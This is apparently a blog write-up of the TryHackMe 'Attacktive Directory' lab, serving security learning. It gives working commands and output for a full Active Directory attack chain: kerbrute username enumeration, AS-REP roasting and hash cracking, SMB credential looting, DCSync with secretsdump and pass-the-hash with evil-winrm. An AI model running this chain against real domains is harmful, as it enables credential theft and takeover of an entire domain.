---
toc: true
comments: true
title: TryHackMe - Attacktive Directory
layout: post
title: TryHackMe - Attacktive Directory
date: 2024-07-28 18:28 -0300
categories: [TryHackMe, Medium, CTF]
tags: [Windows, Active Directory, Kerberos, kerbrute, AS-REP Roasting, Impacket, DCSync, PrivEsc]    
image: /assets/Posts/AttacktiveDirectory/logo.png
---

## Pre
- Back to TryHackMe for a moment, because Attacktive Directory is the best guided introduction to the **Impacket + Kerberos** toolchain I know of.
- It reinforces everything from [Forest](/posts/hackthebox-forest/) and [Active](/posts/hackthebox-active/) but adds a crucial early step those boxes skip: **enumerating valid usernames over Kerberos** with `kerbrute` before you have any credentials at all.

## Phase 1: Recon
```shell
$ nmap -Pn -n -p- --min-rate 10000 --open -vv -oN nmap/firstScan $IP
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
3268/tcp open  globalcatLDAP
```

Textbook Domain Controller. From SMB enumeration (`enum4linux -a $IP`) we recover the domain name **spookysec.local** and the DC hostname. Add it to `/etc/hosts`.

## Phase 2: Username enumeration with kerbrute
Here's the technique the HTB AD boxes don't emphasise. Kerberos leaks whether a username exists: request a ticket for a name, and the KDC's error differs for "user doesn't exist" vs "user exists but pre-auth failed". `kerbrute` weaponises that difference to validate usernames **without a single login attempt** (so it's quiet and doesn't lock accounts):

```shell
$ kerbrute userenum -d spookysec.local --dc 10.10.10.10 userlist.txt
[+] VALID USERNAME:       james@spookysec.local
[+] VALID USERNAME:       svc-admin@spookysec.local
[+] VALID USERNAME:       backup@spookysec.local
```

`svc-admin` is another service account – our AS-REP target.

## Phase 3: AS-REP Roasting
Same idea as Forest: hunt for accounts that don't require Kerberos pre-authentication. We ask Impacket for `svc-admin`'s AS-REP directly:

```shell
$ GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.10.10
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:6c3...<snip>
```

Crack it (hashcat mode 18200):

```shell
$ hashcat -m 18200 svc-admin.hash /usr/share/wordlists/rockyou.txt
$krb5asrep$...:management2005
```

Credentials: `svc-admin : management2005`.

## Phase 4: SMB → backup account
With a valid account we enumerate shares properly, this time authenticated:

```shell
$ smbclient -L //10.10.10.10/ -U 'svc-admin%management2005'
	Sharename       Type      Comment
	---------       ----      -------
	backup          Disk
```

The `backup` share holds a single file, `backup_credentials.txt`, containing a base64 blob:

```shell
$ smbclient //10.10.10.10/backup -U 'svc-admin%management2005' -c 'get backup_credentials.txt'
$ base64 -d backup_credentials.txt
backup@spookysec.local:backup2517860
```

## Phase 5: DCSync → the whole domain
Why does `backup` matter? In this domain the backup account has been granted **replication rights** (the same privilege we *earned* through ACL abuse on Forest). That means it can DCSync – ask the DC to hand over every password hash. No BloodHound path needed; the misconfiguration is pre-baked.

```shell
$ secretsdump.py spookysec.local/backup:backup2517860@10.10.10.10 -just-dc
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
...
```

We dump the **Administrator NTLM hash**. From here it's pass-the-hash into a shell – evil-winrm accepts the hash directly:

```shell
$ evil-winrm -i 10.10.10.10 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
*Evil-WinRM* PS> whoami
spookysec\administrator
```

> Notice the pattern across all three AD boxes: get *a* credential, then abuse a replication/ACL misconfiguration to DCSync the domain. On Forest we had to build the DCSync right ourselves; here `backup` was handed it. Same endgame, different starting point.
{: .prompt-info }

## Conclusions
- Attacktive Directory rounds out the AD trio by front-loading **`kerbrute` username enumeration** – the credential-less first step that makes AS-REP Roasting possible on a real assessment.
- End to end: enumerate users (Kerberos) → AS-REP roast → authenticated SMB loot → DCSync → pass-the-hash. That's a complete, repeatable AD kill chain.
- Defensive notes: enforce pre-auth, never store creds in world-readable shares, and tightly audit which accounts hold directory-replication rights.
- To wrap the roadmap, a fun beginner web box: [Pickle Rick](/posts/tryhackme-pickle-rick/).

_Keep hacking_  🙈🙉🙊
